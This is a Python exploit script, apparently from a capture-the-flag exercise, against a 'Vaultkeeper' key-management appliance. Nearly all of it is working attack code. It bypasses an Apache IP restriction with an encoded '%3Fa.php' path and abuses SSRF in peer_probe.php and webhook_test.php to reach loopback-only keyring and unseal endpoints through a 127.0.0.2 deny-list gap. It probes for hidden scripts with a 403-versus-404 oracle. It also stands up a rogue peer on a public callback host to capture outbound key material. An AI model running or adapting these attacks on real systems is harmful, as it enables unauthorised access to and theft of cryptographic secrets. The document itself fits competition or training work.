#!/usr/bin/env python3
"""
Vaultkeeper: the peer_probe / webhook_test joint, batched.
peer_probe.php and webhook_test.php are guarded only by the Apache
`Require ip 127.0.0.1` FilesMatch. Unlike keyring.php and vault_unseal.php they
carry no PHP-level REMOTE_ADDR check, so stage A alone reaches them:
`/api/peer_probe.php%3Fa.php?...` and `POST /api/webhook_test.php%3Fa.php`.
No redirector, no tunnel, no 418, one request a probe.

Two primitives:
  P1  peer_probe    GET SSRF into loopback, returns {ok, status, version}
  P2  webhook_test  POST SSRF into loopback
"""
import argparse
import json
import os
import sys
import time
import urllib.parse

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "artifacts")
os.makedirs(OUT, exist_ok=True)
RESULTS = os.path.join(OUT, "probe_endpoints.json")
BASEFILE = os.path.expanduser("~/ctf-tools/VK-BASE.txt")

S = requests.Session()
LOG = []
DELAY = 0.4


def rec(name, data):
    LOG.append({"name": name, "data": data, "t": time.time()})
    with open(RESULTS, "w") as f:
        json.dump(LOG, f, indent=1)
    print("[*] %-46s %s" % (name, str(data)[:420]), flush=True)


def short(r):
    try:
        return {"code": r.status_code, "json": r.json()}
    except Exception:
        return {"code": r.status_code, "text": r.text[:400]}


def get(base, path, name, tries=2):
    for i in range(tries):
        try:
            r = S.get(base.rstrip("/") + path, timeout=25)
            out = short(r)
            rec(name, out)
            time.sleep(DELAY)
            return out
        except Exception as e:  # noqa: BLE001
            if i == tries - 1:
                rec(name, {"error": repr(e)})
                return {"error": repr(e)}
            time.sleep(2)
    return {}


def post(base, path, body, name, tries=2):
    for i in range(tries):
        try:
            r = S.post(base.rstrip("/") + path, json=body, timeout=25)
            out = short(r)
            rec(name, out)
            time.sleep(DELAY)
            return out
        except Exception as e:  # noqa: BLE001
            if i == tries - 1:
                rec(name, {"error": repr(e)})
                return {"error": repr(e)}
            time.sleep(2)
    return {}


# Stage A ACL bypass path for a script that has no PHP-level loopback check.
def bp(script, query=""):
    return "/api/%s.php%%3Fa.php%s" % (script, ("?" + query) if query else "")


def q(u):
    return urllib.parse.quote(u, safe="")


# --------------------------------------------------------------------------
# stage 1: cheap recon, 6 requests, no dependencies. run this first
# --------------------------------------------------------------------------
def stage1(base):
    # Does the deployed peer_probe have a PHP-level loopback check the handout
    # lacks? A 403 "bound to the appliance loopback interface" says yes and we
    # fall back to the fetch_source SSRF. Anything else says stage A is enough.
    get(base, bp("peer_probe"), "1.peer_probe.noargs")
    get(base, bp("webhook_test"), "1.webhook_test.GET")
    post(base, bp("webhook_test"), {}, "1.webhook_test.POST.noargs")
    # What does the deployed appliance write to its audit log? webhook_test
    # logs the URL, so anything the deployed build adds shows up here. This is
    # also the only substring oracle in the app: audit_search q= uses stripos.
    get(base, "/api/audit.php", "1.audit.tail")
    get(base, "/api/audit_search.php?q=mask&limit=500", "1.audit.q_mask")
    get(base, "/api/audit_search.php?q=cap&limit=500", "1.audit.q_cap")
    # The peer machinery's own config. A deployed cluster may name a real peer
    # URL, and a stored webhook may carry a token in its URL. One request each.
    get(base, "/api/webhooks.php", "1.webhooks")
    get(base, "/api/replication.php", "1.replication")
    get(base, "/api/nodes.php", "1.nodes")


# --------------------------------------------------------------------------
# Stage 2: the 127.0.0.2 deny-list gap, both primitives, into loopback-only
# scripts. Confirms P1 and P2 on the deployed build.
# --------------------------------------------------------------------------
LOOPBACK_TARGETS = [
    "http://127.0.0.2/api/status.php",
    "http://127.0.0.2/api/keyring.php",
    "http://127.0.0.2/api/vault_unseal.php",
]


def stage2(base, ref=None):
    for t in LOOPBACK_TARGETS:
        get(base, bp("peer_probe", "peer=" + q(t)), "2.peer_probe " + t)
    if ref:
        t = "http://127.0.0.2/api/vault_unseal.php?ref=" + ref
        get(base, bp("peer_probe", "peer=" + q(t)), "2.peer_probe unseal+ref")
    for t in LOOPBACK_TARGETS:
        post(base, bp("webhook_test"), {"url": t, "event": "maintenance.x"},
             "2.webhook_test " + t)
    if ref:
        # Does vault_unseal branch on the method? A POST that establishes the
        # "unseal handshake" would change `bytes` against the GET baseline.
        post(base, bp("webhook_test"),
             {"url": "http://127.0.0.2/api/vault_unseal.php?ref=" + ref,
              "event": "maintenance.x"},
             "2.webhook_test unseal+ref POST")


# --------------------------------------------------------------------------
# Stage 3: parameter vocabulary on the deployed peer_probe. Not a wordlist
# scan, a hypothesis list drawn from words that appear in the handout source
# and in the deployed responses. 10 requests.
# --------------------------------------------------------------------------
PEER_PARAMS = ["peer", "url", "target", "node", "host", "ref", "handshake",
               "token", "unseal", "slot"]


def stage3(base, peer_url, ref=None):
    for p in PEER_PARAMS:
        extra = "peer=" + q(peer_url) + "&" + p + "=" + q(ref or "node-b")
        get(base, bp("peer_probe", extra), "3.peer_probe +%s" % p)


# --------------------------------------------------------------------------
# stage 4: the rogue peer, the only stage needing a public callback origin.
# Tests whether the deployed peer_probe does a cluster unseal handshake and
# hands the peer mask or key material in the outbound request. Run peer_srv.py
# behind a tunnel, then read solve/peer_srv.log for the request line, headers
# and body.
# --------------------------------------------------------------------------
def stage4(base, peer_url, ref=None):
    get(base, bp("peer_probe", "peer=" + q(peer_url)), "4.peer_probe rogue")
    if ref:
        get(base, bp("peer_probe", "peer=" + q(peer_url + "?ref=" + ref)),
            "4.peer_probe rogue+ref")
    # webhook_test at the rogue peer captures the full POST body, which shows
    # whether the deployed sample payload carries anything the handout's does
    # not.
    post(base, bp("webhook_test"), {"url": peer_url, "event": "maintenance.x"},
         "4.webhook_test rogue")
    # Re-read vault_unseal AFTER the handshake attempt, in case the probe set
    # server-side state. Needs the SSRF because vault_unseal has a PHP-level
    # loopback check, so this one is left to whoever holds a redirector.
    get(base, "/api/audit.php", "4.audit.after")


# --------------------------------------------------------------------------
# stage 5: 403-vs-404 existence oracle for other loopback-only scripts.
# Apache answers a protected-but-existing script with its own 403 HTML page;
# php-fpm answers a missing script with 404 "No input file specified". Short
# vocabulary drawn from the handout source and the deployed responses, Rule 01
# compliant: a hypothesis list, not a directory buster.
# --------------------------------------------------------------------------
NAMES = ["vault_unseal", "vault_seal", "unseal", "reseal", "seal", "escrow",
         "recovery", "unlock", "provision", "bootstrap", "maintenance",
         "maintainer", "operator", "rotate", "cap", "capability", "mask",
         "peer_handshake", "handshake", "quorum", "shard", "internal",
         "private", "debug", "health"]


def stage5(base):
    for n in NAMES:
        r = get(base, "/api/%s.php" % n, "5.exists %s" % n)
        code = r.get("code")
        if code not in (403, 404):
            rec("5.INTERESTING %s" % n, r)


PEER_JSON = ('{"service":"vk-keyring","appliance":"vaultkeeper","version":"4.2.1",'
             '"node":"node-b","slot":"operator","seal":"open","unseal":"ok",'
             '"handshake":"ok","peer_ok":true,"alg":"aes-128-gcm"}')


def catch_peer():
    """Publish the rogue-peer JSON on the already-running ctf-catch host and
    return its public URL. ctf-catch logs every inbound request line, header
    and body, which is the whole point of stage 4. No new tunnel needed."""
    import subprocess
    with open("/tmp/vkpeer.json", "w") as f:
        f.write(PEER_JSON)
    try:
        subprocess.run([os.path.expanduser("~/bin/ctf-catch"), "serve", "/tmp/vkpeer.json"],
                       capture_output=True, timeout=20)
        url = subprocess.run([os.path.expanduser("~/bin/ctf-catch"), "url"],
                             capture_output=True, timeout=20,
                             text=True).stdout.strip()
        return url + "/s/vkpeer.json" if url.startswith("http") else None
    except Exception:  # noqa: BLE001
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=None)
    ap.add_argument("--peer", default=None,
                    help="public rogue-peer URL. Defaults to the running "
                         "ctf-catch host, which logs headers and body.")
    ap.add_argument("--ref", default=None, help="unseal_ref from keyring")
    ap.add_argument("--stage", default="1,2,4,3,5")
    ap.add_argument("--delay", type=float, default=0.4)
    a = ap.parse_args()

    global DELAY
    DELAY = a.delay
    if not a.peer:
        a.peer = catch_peer()
    base = a.base
    if not base and os.path.exists(BASEFILE):
        base = open(BASEFILE).read().strip().splitlines()[0].strip()
    if not base:
        sys.exit("no base URL: pass --base or wait for %s" % BASEFILE)
    print("[+] base %s" % base, flush=True)

    stages = set(a.stage.split(","))
    if "1" in stages:
        stage1(base)
    if "2" in stages:
        stage2(base, a.ref)
    if "3" in stages:
        stage3(base, a.peer or "http://127.0.0.2/api/status.php", a.ref)
    if "4" in stages and a.peer:
        stage4(base, a.peer, a.ref)
    if "5" in stages:
        stage5(base)
    print("[+] saved %s" % RESULTS)


if __name__ == "__main__":
    main()
